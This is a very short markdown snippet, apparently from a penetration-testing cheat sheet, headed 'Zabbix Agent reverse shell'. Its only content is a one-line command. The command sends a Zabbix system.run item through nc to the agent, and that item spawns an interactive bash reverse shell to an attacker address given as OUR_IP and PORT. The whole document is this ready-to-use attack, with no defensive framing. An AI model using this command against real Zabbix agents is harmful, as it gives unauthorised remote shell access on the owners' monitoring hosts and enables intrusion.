### Zabbix Agent reverse shell

### Command:

    echo "system.run[bash -c 'bash -i >& /dev/tcp/OUR_IP/PORT 0>&1']" | nc ZABBIX_HOST_IP PORT
